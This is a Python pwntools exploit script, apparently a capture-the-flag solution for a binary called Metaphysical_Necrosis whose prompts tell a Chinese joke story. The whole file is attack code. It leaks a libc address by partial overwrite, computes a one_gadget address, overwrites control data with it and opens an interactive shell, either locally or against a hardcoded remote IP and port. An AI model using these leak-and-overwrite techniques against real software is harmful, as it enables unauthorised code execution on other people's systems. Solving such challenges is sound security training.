#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 1
context(arch="amd64", endian='el', os="linux")
context.log_level = "debug"
if debug == 1:
    p = process('./Metaphysical_Necrosis')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
else:
    p = remote('47.103.214.163', 21003)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
elf = ELF('./Metaphysical_Necrosis', checksec=False)


libc_one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
gdb.attach(p, "b *$rebase(0xC8C)\nb *$rebase(0xF18)\nc")
p.sendlineafter('你要把C4安放在哪里呢？\n', str(5))
p.send('\x16')
p.sendlineafter('the bomb has been planted!\n', '')
p.sendlineafter('不如把它宰了，吃一顿大餐，你说吼不吼啊！\n', '')
p.sendlineafter('但是这一年多对它也有了些许感情，因此为了纪念它，你决定给它起个名字:', 'bbbb')
p.sendlineafter('接下来开始切菜，你打算把它切成几段呢？\n', str(0))
p.recvuntil('接下来你打算把剩下的鱼骨头做成标本。\n')
sleep(1)
p.sendlineafter('就在此时，你发现了一根茄子，这根茄子居然已经把锅里的金枪鱼吃了大半。\n', '')
p.sendlineafter('仔细观察一下，你发现这居然是一只E99p1ant，并且有大量邪恶的能量从中散发。\n', '')
p.sendlineafter('你吓得立马扔掉了它，E99p1ant在空中飞行了114514秒，请问它经过的路程是__m:\n', str(10))
p.recvuntil('E99p1ant落地后，发现旁边居然有一个C4……Bomb！Terrorist Win\n')

addr___libc_start_main = u64(p.recv(6).ljust(8, '\x00')) - 214
libcbase = addr___libc_start_main - libc.sym['__libc_start_main']
addr_one_gadget = libcbase + libc_one_gadget[0]

p.sendlineafter('E99p1ant不甘地大喊:啊~~！~？~…____\n', 'BBBB')

p.sendlineafter('你要把C4安放在哪里呢？\n', str(5))
p.send(p64(addr_one_gadget))
p.sendlineafter('the bomb has been planted!\n', '')
p.sendlineafter('不如把它宰了，吃一顿大餐，你说吼不吼啊！\n', '')
p.sendlineafter('但是这一年多对它也有了些许感情，因此为了纪念它，你决定给它起个名字:', 'bbbb')
p.sendlineafter('接下来开始切菜，你打算把它切成几段呢？\n', str(0))
p.recvuntil('接下来你打算把剩下的鱼骨头做成标本。\n')
sleep(1)
p.sendlineafter('就在此时，你发现了一根茄子，这根茄子居然已经把锅里的金枪鱼吃了大半。\n', '')
p.sendlineafter('仔细观察一下，你发现这居然是一只E99p1ant，并且有大量邪恶的能量从中散发。\n', '')
p.sendlineafter('你吓得立马扔掉了它，E99p1ant在空中飞行了114514秒，请问它经过的路程是__m:\n', str(10))
p.recvuntil('E99p1ant落地后，发现旁边居然有一个C4……Bomb！Terrorist Win\n')
p.sendlineafter('E99p1ant不甘地大喊:啊~~！~？~…____\n', '/bin/sh\x00')
success('addr___libc_start_main = ' + hex(addr___libc_start_main))
success('addr_one_gadget        = ' + hex(addr_one_gadget))
p.interactive()
